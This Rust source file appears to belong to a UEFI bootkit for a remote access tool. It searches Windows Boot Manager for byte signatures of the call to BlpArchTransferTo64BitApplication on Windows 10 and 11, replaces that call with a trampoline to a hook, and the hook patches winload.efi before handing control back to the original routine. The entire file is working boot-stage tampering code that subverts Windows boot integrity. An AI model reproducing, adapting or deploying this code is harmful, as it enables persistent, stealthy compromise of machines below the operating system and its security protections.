use core::mem;
use core::sync::atomic::{AtomicI64, Ordering};

use log::{error, info};
use rat_common::windows::utils::insert_call_trampoline;

use crate::hooks::winload::patch_winload;
use crate::patcher::VariablePatternFinder;
use crate::utils;

type _BlpArchTransferTo64BitApplicationFn = unsafe extern "efiapi" fn(
    entrypoint: *mut u8,
    params: *mut u8,
    top_of_stack: *mut u8,
    page_table_base: *mut u8,
    flags: i32,
    descriptor_table_context: *mut u8,
) -> i64;

static _ORIGINAL_BLP_ARCH_TRANSFER_TO64_BIT_APPLICATION: AtomicI64 = AtomicI64::new(0);

const _BLP_ARCH_TRANSFER_TO64_BIT_APPLICATION: &[[u8; 21]] = &[
    // Windows 10
    [
        0x03, 0x4D, 0x67, 0x48, 0x89, 0x44, 0x24, 0x28, // 8 bytes before
        0xE8, 0xFE, 0x29, 0x08, 0x00, // call BlpArchTransferTo64BitApplication
        0x44, 0x8B, 0xF0, 0xE8, 0xA6, 0xBF, 0x00, 0x00, // 8 bytes after
    ],
    [
        0x03, 0x4D, 0x67, 0x48, 0x89, 0x44, 0x24, 0x28, // 8 bytes before
        0xE8, 0x8E, 0x37, 0x08, 0x00, // call BlpArchTransferTo64BitApplication
        0x44, 0x8B, 0xF0, 0xE8, 0xA6, 0xBF, 0x00, 0x00, // 8 bytes after
    ],
    // Windows 11
    [
        0x4D, 0x8B, 0xCE, 0x44, 0x88, 0x64, 0x24, 0x20, // 8 bytes before
        0xE8, 0x42, 0xAA, 0x08, 0x00, // call BlpArchTransferTo64BitApplication
        0x8B, 0xF0, 0xE8, 0x7B, 0xC3, 0x00, 0x00, 0x48, // 8 bytes after
    ],
    [
        0x4D, 0x8B, 0xCE, 0x44, 0x88, 0x64, 0x24, 0x20, // 8 bytes before
        0xE8, 0x15, 0x6A, 0x09, 0x00, // call BlpArchTransferTo64BitApplication
        0x8B, 0xF0, 0xE8, 0x2A, 0x64, 0x00, 0x00, 0x48, // 8 bytes before
    ],
];

unsafe extern "efiapi" fn _blp_arch_transfer_to64_bit_application_hooked(
    entrypoint: *mut u8,
    params: *mut u8,
    top_of_stack: *mut u8,
    page_table_base: *mut u8,
    flags: i32,
    descriptor_table_context: *mut u8,
) -> i64 {
    match unsafe { utils::find_pe_image_mut(entrypoint) } {
        Some(winload) => patch_winload(winload),
        None => {
            error!("Cannot find winload.efi PE image");
        }
    }

    let original =
        _ORIGINAL_BLP_ARCH_TRANSFER_TO64_BIT_APPLICATION.load(Ordering::Acquire) as *const u8;
    unsafe {
        let original_fn =
            mem::transmute::<*const u8, _BlpArchTransferTo64BitApplicationFn>(original);
        original_fn(
            entrypoint,
            params,
            top_of_stack,
            page_table_base,
            flags,
            descriptor_table_context,
        )
    }
}

pub fn patch_bootmgfw(bootmgfw: &mut [u8]) {
    info!("Patching bootmgfw_old.efi...");

    if let Some(original) =
        VariablePatternFinder::new(_BLP_ARCH_TRANSFER_TO64_BIT_APPLICATION).find_mut(bootmgfw)
    {
        let original = &mut original[8..];
        let original_call_addr =
            original.as_ptr() as i64 + 5 + i64::from(utils::extract_call_rel32(original));
        _ORIGINAL_BLP_ARCH_TRANSFER_TO64_BIT_APPLICATION
            .store(original_call_addr, Ordering::Release);

        // While patching this `call` instruction, we also override some instructions after it
        // because the original `call` only has 5 bytes but the patch to `call rax` is way
        // longer than that. However, we do not really need to patch back the instructions at
        // return address.
        // Why? Ideally, BlpArchTransferTo64BitApplication transfers control to winload.efi
        // (which eventually transfers to ntoskrnl.exe). Therefore, this function (and also its
        // hooked variant) should never return, and we do not need to fix return address
        // corruption (maybe?).
        if insert_call_trampoline(
            original,
            _blp_arch_transfer_to64_bit_application_hooked as *const u8 as u64,
            None,
            None,
        ) {
            info!("Patched call to BlpArchTransferTo64BitApplication");
            return;
        }
    }

    error!("Cannot find BlpArchTransferTo64BitApplication");
}
